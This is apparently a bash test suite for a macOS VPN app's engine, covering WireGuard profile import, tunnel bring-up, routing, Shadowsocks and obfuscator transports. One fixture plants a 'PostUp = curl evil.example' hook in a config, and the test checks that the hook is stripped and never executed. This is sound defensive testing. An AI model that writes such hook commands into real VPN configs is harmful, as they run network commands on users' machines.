#!/usr/bin/env bash
# Engine checks for the macOS app. wireguard-go, route, and ifconfig are fakes.
set -euo pipefail

MACOS="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ROOT="$(cd "$MACOS/../ubuntu" && pwd)"
export PATH="$MACOS/tests/bin:$PATH"
WORKDIR="$(mktemp -d)"
trap 'kill $(pgrep -f "$WORKDIR/lib/bin/wireguard-go" || true) 2>/dev/null || true; rm -rf "$WORKDIR"' EXIT
export CONTINUUM_VPN_PLATFORM=darwin
export CONTINUUM_VPN_CONFIG_DIR="$WORKDIR/config"
export CONTINUUM_VPN_RUNTIME_DIR="$WORKDIR/run"
export CONTINUUM_VPN_LISTEN_DIR="$WORKDIR/listen"
export CONTINUUM_VPN_IP_LOG="$WORKDIR/ip.log"
export CONTINUUM_VPN_WG_LOG="$WORKDIR/uapi.log"
export CONTINUUM_VPN_WG_SOCK_DIR="$WORKDIR/socks"
export CONTINUUM_VPN_NO_PRIV=1
export CONTINUUM_VPN_BIN_DIR="$WORKDIR/lib/bin"
export CONTINUUM_VPN_HELPER="$WORKDIR/lib/priv-helper"
mkdir -p "$CONTINUUM_VPN_CONFIG_DIR" "$CONTINUUM_VPN_RUNTIME_DIR" "$CONTINUUM_VPN_LISTEN_DIR" "$CONTINUUM_VPN_WG_SOCK_DIR" "$WORKDIR/lib/bin"
chmod 700 "$CONTINUUM_VPN_CONFIG_DIR" "$CONTINUUM_VPN_RUNTIME_DIR" "$CONTINUUM_VPN_WG_SOCK_DIR"
cp "$MACOS/lib/priv-helper" "$CONTINUUM_VPN_HELPER"
cp "$ROOT/tests/bin/sslocal" "$ROOT/tests/bin/wg-obfuscator" "$MACOS/tests/bin/wireguard-go" "$CONTINUUM_VPN_BIN_DIR/"
chmod 755 "$CONTINUUM_VPN_HELPER" "$CONTINUUM_VPN_BIN_DIR/"* "$MACOS/tests/bin/"*
touch "$CONTINUUM_VPN_IP_LOG"

ENGINE=(python3 "$ROOT/lib/engine.py")
PRIV="$(wg genkey)"
PUB="$(printf '%s\n' "$PRIV" | wg pubkey)"

assert_fail() {
  local needle="$1"
  shift
  local err
  if err="$("$@" 2>&1)"; then
    echo "expected failure: $*" >&2
    exit 1
  fi
  printf '%s\n' "$err" | grep -q "$needle" || {
    echo "missing [$needle] in: $err" >&2
    exit 1
  }
}

assert_fail "udp2raw is not started" "${ENGINE[@]}" import-text "raw.json" <<EOF
{"label":"raw","source":"egress","obfuscation":"udp2raw","iface":"cont-raw","wireGuardConfig":"[Interface]\\nPrivateKey = $PRIV\\nAddress = 10.8.0.2/32\\n[Peer]\\nPublicKey = $PUB\\nEndpoint = 198.51.100.8:51820\\nAllowedIPs = 0.0.0.0/0\\n","transportBinary":"udp2raw","transportFilename":"x.json","transportConfig":"{}"}
EOF

LABEL="$("${ENGINE[@]}" import-text "cont-full.conf" <<EOF
[Interface]
PrivateKey = $PRIV
Address = 10.8.0.2/32
DNS = 10.8.0.1
PostUp = curl evil.example
[Peer]
PublicKey = $PUB
Endpoint = 198.51.100.8:51820
AllowedIPs = 0.0.0.0/0
EOF
)"
[[ "$LABEL" == "cont-full" ]]
if grep -q 'PostUp' "$CONTINUUM_VPN_CONFIG_DIR/profiles/cont-full/wg.conf"; then
  echo "hook line was stored" >&2
  exit 1
fi
[[ "$("${ENGINE[@]}" up cont-full)" == "cont-full" ]]
grep -q 'allowed_ip=0.0.0.0/0' "$CONTINUUM_VPN_WG_LOG"
if grep -q 'PostUp\|curl' "$CONTINUUM_VPN_WG_LOG"; then
  echo "hook text reached wireguard-go" >&2
  exit 1
fi
grep -q 'ifconfig utun9 inet 10.8.0.2' "$CONTINUUM_VPN_IP_LOG"
grep -q 'route -n add -net 0.0.0.0/1' "$CONTINUUM_VPN_IP_LOG"
grep -q '10.8.0.1' "$CONTINUUM_VPN_IP_LOG"
if ps -ef | grep -q '[c]url evil'; then
  echo "a hook command was executed" >&2
  exit 1
fi
python3 - "$("${ENGINE[@]}" list)" <<'PY'
import json, sys
rows = {row["iface"]: row for row in json.loads(sys.argv[1])}
assert rows["cont-full"]["active"] is True
PY

SS="$WORKDIR/ss.json"
python3 - "$SS" "$PRIV" "$PUB" <<'PY'
import json, sys
path, priv, pub = sys.argv[1:]
json.dump({
  "label": "Frankfurt",
  "countryCode": "DE",
  "detail": "WireGuard, with Shadowsocks, limited to 20 Mbps",
  "source": "egress",
  "obfuscation": "shadowsocks",
  "iface": "eg-ss",
  "wireGuardConfig": f"[Interface]\nPrivateKey = {priv}\nAddress = 10.8.0.2/32\n[Peer]\nPublicKey = {pub}\nEndpoint = 127.0.0.1:51821\nAllowedIPs = 0.0.0.0/0\n",
  "transportBinary": "sslocal",
  "transportFilename": "eg-ss.json",
  "transportConfig": '{"server": "203.0.113.5", "server_port": 8388, "local_port": 51821, "password": "secret", "method": "chacha20-ietf-poly1305"}\n',
}, open(path, "w"))
PY
[[ "$("${ENGINE[@]}" import-file "$SS")" == "Frankfurt" ]]
[[ "$("${ENGINE[@]}" up eg-ss)" == "Frankfurt" ]]
test -f "$CONTINUUM_VPN_LISTEN_DIR/51821"
grep -q 'route -n add -host 203.0.113.5' "$CONTINUUM_VPN_IP_LOG"
python3 - "$("${ENGINE[@]}" list)" <<'PY'
import json, sys
rows = {row["iface"]: row for row in json.loads(sys.argv[1])}
assert rows["eg-ss"]["active"] is True
assert rows["eg-ss"]["countryFlag"] == "🇩🇪"
assert rows["eg-ss"]["rateLimit"] == "20 Mbps"
assert rows["cont-full"]["active"] is False
PY

WO="$WORKDIR/wgo.json"
python3 - "$WO" "$PRIV" "$PUB" <<'PY'
import json, sys
path, priv, pub = sys.argv[1:]
json.dump({
  "label": "Obfuscated",
  "source": "admin",
  "obfuscation": "wg_obfuscator",
  "iface": "cont-wgo",
  "wireGuardConfig": f"[Interface]\nPrivateKey = {priv}\nAddress = 10.8.0.2/32\n[Peer]\nPublicKey = {pub}\nEndpoint = 127.0.0.1:51822\nAllowedIPs = 10.8.0.0/24\n",
  "transportBinary": "wg-obfuscator",
  "transportFilename": "cont-wgo.conf",
  "transportConfig": "source-lport = 51822\ntarget = 198.51.100.9:51820\n",
}, open(path, "w"))
PY
[[ "$("${ENGINE[@]}" import-file "$WO")" == "Obfuscated" ]]
[[ "$("${ENGINE[@]}" up cont-wgo)" == "Obfuscated" ]]
test -f "$CONTINUUM_VPN_LISTEN_DIR/51822"
grep -q 'route -n add -net 10.8.0.0/24' "$CONTINUUM_VPN_IP_LOG"
"${ENGINE[@]}" delete cont-wgo >/dev/null
"${ENGINE[@]}" delete eg-ss >/dev/null
if [[ -d "$CONTINUUM_VPN_CONFIG_DIR/profiles/cont-wgo" ]]; then
  echo "deleted profile remains" >&2
  exit 1
fi
ENGINE_LIB="$ROOT/lib" python3 - <<'PY'
import os, sys
sys.path.insert(0, os.environ["ENGINE_LIB"])
import engine
assert engine.mac_arch_label("arm64") == "arm64"
assert engine.mac_arch_label("x86_64") == "x64"
assets = [
    {"name": "continuum-vpn-widget-macos-arm64.zip", "browser_download_url": "https://example.invalid/arm"},
    {"name": "continuum-vpn-widget-macos-x64.zip", "browser_download_url": "https://example.invalid/x64"},
]
assert engine.choose_release_asset(assets, engine.MAC_ARM_ASSET) == "https://example.invalid/arm"
assert engine.choose_release_asset(assets, engine.MAC_X64_ASSET) == "https://example.invalid/x64"
assert engine.package_format() == "zip"
PY
echo "ok"
